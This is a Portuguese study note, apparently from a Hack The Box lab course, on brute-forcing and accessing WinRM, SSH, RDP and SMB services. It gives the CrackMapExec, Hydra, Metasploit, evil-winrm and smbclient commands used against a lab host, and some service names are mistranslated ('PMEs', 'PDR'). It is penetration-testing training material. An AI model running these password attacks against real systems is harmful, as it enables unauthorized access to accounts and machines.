Cada rede de computadores que encontrarmos terá serviços instalados para gerenciar, editar ou criar conteúdo. Esses serviços são hospedados usando permissões específicas e são atribuídos a usuários específicos.

Além de aplicativos da web, esses serviços incluem (mas não estão limitados a):

|           |       |             |
| --------- | ----- | ----------- |
| TP        | PMEs  | NFS         |
| IMAP/POP3 | SSH   | MySQL/MSSQL |
| PDR       | WinRM | VNC         |
| Telnet    | SMTP  | LDAP        |

Se queremos executar comandos nele ou acessar seu conteúdo por meio de uma GUI ou do terminal em um sistema. Os serviços mais comuns adequados para isso são `RDP`, `WinRM`, e `SSH`. O SSH agora é muito menos comum no Windows, mas é o serviço líder para sistemas baseados em Linux.

Todos esses serviços têm um mecanismo de autenticação usando um nome de usuário e senha.

## WinRM

Aqui está o resumo com as referências:

O **Windows Remote Management (WinRM)** é a implementação da Microsoft do protocolo **Web Services Management Protocol (WS-Management)**, utilizando XML e **Simple Object Access Protocol (SOAP)** para gerenciamento remoto de sistemas Windows. Ele facilita a comunicação entre **Web-Based Enterprise Management (WBEM)** e **Windows Management Instrumentation (WMI)**, podendo interagir com o **Distributed Component Object Model (DCOM)**.

O WinRM deve ser ativado e configurado manualmente no Windows 10. A segurança é crucial e geralmente envolve o uso de certificados ou mecanismos de autenticação específicos. O WinRM opera nas portas TCP **5985 (HTTP)** e **5986 (HTTPS)**.

Para ataques de senha, a ferramenta **CrackMapExec** é útil e também suporta outros protocolos como SMB, LDAP e MSSQL. A [documentação oficial](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) da ferramenta fornece mais informações sobre seu uso.

#### CrackMapExec

#### Instalação
```shell-session
NycolasRamos@htb[/htb]$ sudo apt-get -y install crackmapexec
```

#### Opções de menu do CrackMapExec
Executar a ferramenta com o sinalizador `-h` nos mostrará instruções gerais de uso e algumas opções disponíveis.

```shell-session
NycolasRamos@htb[/htb]$  crackmapexec -h
```

#### Ajuda específica do protocolo CrackMapExec
Note que podemos especificar um protocolo específico e receber um menu de ajuda mais detalhado de todas as opções disponíveis para nós.

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb -h
```

#### Uso do CrackMapExec
O formato geral para usar o CrackMapExec é o seguinte:

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

A aparência de `(Pwn3d!)`é o sinal de que podemos muito provavelmente executar comandos do sistema se fizermos login com o usuário do brute force. Outra ferramenta útil  é [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) , que nos permite comunicar com o serviço WinRM de forma eficiente.

#### Evil-WinRM

#### Instalando Evil-WinRM
```shell-session
NycolasRamos@htb[/htb]$ sudo gem install evil-winrm
```

#### Uso do Evil-WinRM
```shell-session
NycolasRamos@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
NycolasRamos@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
```

Se o login for bem-sucedido, uma sessão de terminal será inicializada usando o [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) ( `MS-PSRP`), o que simplifica a operação e a execução de comandos.

## SSH
[Secure Shell](https://www.ssh.com/academy/ssh/protocol) ( `SSH`) é uma maneira mais segura de se conectar a um host remoto para executar comandos do sistema ou transferir arquivos de um host para um servidor. Este serviço usa três operações/métodos de criptografia diferentes: `symmetric`criptografia, `asymmetric`criptografia e `hashing`.

1. **Criptografia Simétrica**: Usa uma única chave para criptografia e descriptografia. A chave deve ser trocada de forma segura entre as partes envolvidas, geralmente usando métodos como o Diffie-Hellman. Exemplos incluem AES, Blowfish e 3DES.

2. **Criptografia Assimétrica**: Utiliza um par de chaves (uma pública e uma privada). A chave privada deve ser mantida em segredo e é usada para descriptografar mensagens criptografadas com a chave pública. É essencial que a chave privada esteja bem protegida para evitar acesso não autorizado.

3. **Hashing**: Converte dados em um valor fixo e único, utilizado para garantir a integridade das mensagens. O processo é unidirecional, ou seja, é impossível reverter o hash para obter os dados originais. No SSH, hashing ajuda a verificar a autenticidade das mensagens.

#### Hydra - SSH
Podemos usar uma ferramenta como `Hydra` para força bruta SSH. Isso é abordado em profundidade no módulo [Login Brute Forcing .](https://academy.hackthebox.com/course/preview/login-brute-forcing/introduction-to-brute-forcing)

```shell-session
NycolasRamos@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
```
![[Pasted image 20240905191421.png]]

Para efetuar login no sistema via protocolo SSH, podemos usar o cliente OpenSSH, que está disponível por padrão na maioria das distribuições Linux.

```shell-session
NycolasRamos@htb[/htb]$ ssh user@10.129.42.197
```

## Protocolo de Área de Trabalho Remota (RDP)
O **RDP** é um protocolo de rede da Microsoft que permite acesso remoto a sistemas Windows. Utiliza a porta TCP **3389** por padrão. O protocolo define dois participantes: o **servidor de terminal** (onde o trabalho ocorre) e o **cliente de terminal** (que controla o servidor remotamente).

O RDP permite a troca de imagem, som, teclado e dispositivos apontadores, além de possibilitar impressão e acesso a mídias de armazenamento conectadas ao cliente. O RDP opera como um protocolo de camada de aplicativo na pilha IP e pode usar tanto TCP quanto UDP para transmissão de dados. É utilizado por aplicativos Microsoft e algumas soluções de terceiros.

#### Hydra - RDP
Também podemos usar `Hydra`para executar força bruta RDP.

```shell-session
NycolasRamos@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```

O  Linux oferece diferentes clientes para se comunicar com o servidor desejado usando o protocolo RDP. Estes incluem [Remmina](https://remmina.org/) , [rdesktop](http://www.rdesktop.org/) , [xfreerdp](https://linux.die.net/man/1/xfreerdp) e muitos outros.

#### xFreeRDP
```shell-session
NycolasRamos@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```shell-session
NycolasRamos@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
```

![[Pasted image 20240905184941.png]]

## PMEs
**Server Message Block (SMB)** é um protocolo para transferência de dados entre clientes e servidores em redes locais, utilizado principalmente para compartilhamento de arquivos e impressão em redes Windows. Embora seja frequentemente referido como um sistema de arquivos, o SMB não é exatamente isso. Ele pode ser comparado ao NFS usado em Unix e Linux para fornecer drives em redes locais.

SMB é também conhecido como **Common Internet File System (CIFS)**, o que permite a conexão remota universal entre várias plataformas, como Windows, Linux e macOS. Uma implementação de código aberto do SMB é o **Samba**. Para SMB, ferramentas como o **Hydra** podem ser usadas para realizar ataques de força bruta, tentando diferentes combinações de nomes de usuários e senhas.

#### Hydra - PME
```shell-session
NycolasRamos@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

No entanto, também podemos receber o seguinte erro descrevendo que o servidor enviou uma resposta inválida.

#### Hydra - Erro
```shell-session
NycolasRamos@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

<SNIP>

[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Isso ocorre provavelmente a uma versão desatualizada que não lida com SMBv3. Podemos recompilar uma nova versão do hydra manualmente ou usar outra ferramenta poderosa, o Metasploit Framework.

#### Metasploit Framework
```shell-session
NycolasRamos@htb[/htb]$ msfconsole -q
```

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 
```
![[Pasted image 20240905185526.png]]

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
```
![[Pasted image 20240905185554.png]]

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
```
![[Pasted image 20240905185612.png]]

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
```
![[Pasted image 20240905185650.png]]

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > run
```
![[Pasted image 20240905185707.png]]

Agora podemos usar `CrackMapExec`novamente para visualizar os compartilhamentos disponíveis e quais privilégios temos para eles.

#### CrackMapExec
```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
![[Pasted image 20240905185837.png]]

Podemos nos comunicar, listar diretórios fazer upload e download de arquivos em um servidor SMB com a ferramenta  [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).

#### smbclient
```shell-session
NycolasRamos@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```



















































